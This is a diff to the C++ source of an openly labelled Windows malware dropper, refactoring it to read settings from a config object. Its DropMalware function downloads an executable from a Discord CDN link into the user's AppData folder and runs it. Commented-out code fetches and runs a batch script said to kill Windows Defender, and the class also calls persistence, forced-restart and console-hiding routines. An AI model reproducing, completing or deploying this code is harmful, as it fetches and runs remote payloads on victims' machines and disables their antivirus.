@@ -1,14 +1,14 @@
 #include "includes.h"
+#include "Config.h"
 #include "Dropper.h"
 
-const char* progPath = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Something.exe";
 
 void Dropper::Init(Config config)
 {
 	//system(progPath);
 
 	if (config.Drop == true)
-		DropMalware();
+		DropMalware(config);
 	if (config.Persistence == true)
 		Persistence();
 	if (config.RestartPC == true)
@@ -16,20 +16,21 @@ void Dropper::Init(Config config)
 	if (config.HideConsoleWindow == true)
 		HideConsoleWD();
 }
-void Dropper::DropMalware()
+void Dropper::DropMalware(Config config)
 {
 	/* Bypasses Windows Defender(just kills it)(* not fud) credits goes to @swagkarna
 	// https://raw.githubusercontent.com/swagkarna/Defeat-Defender-V1.2/main/Defeat-Defender.bat
 	HRESULT hr = URLDownloadToFile(NULL, _T("https://raw.githubusercontent.com/swagkarna/Defeat-Defender-V1.2/main/Defeat-Defender.bat"),
 		_T("C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\bypass.bat"), 0, NULL);
-	*/
+	
 	system("C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\bypass.bat");
+	*/
 	// Downloads and saves malware
 	HRESULT hr2 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/977269828966559846/988461384973033522/programa.exe"),
 		_T("C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Something.exe"), 0, NULL);
 
 	// Run dropped file
-	system(progPath);
+	system(config.progPath);
 }
 void Dropper::Persistence()
 {
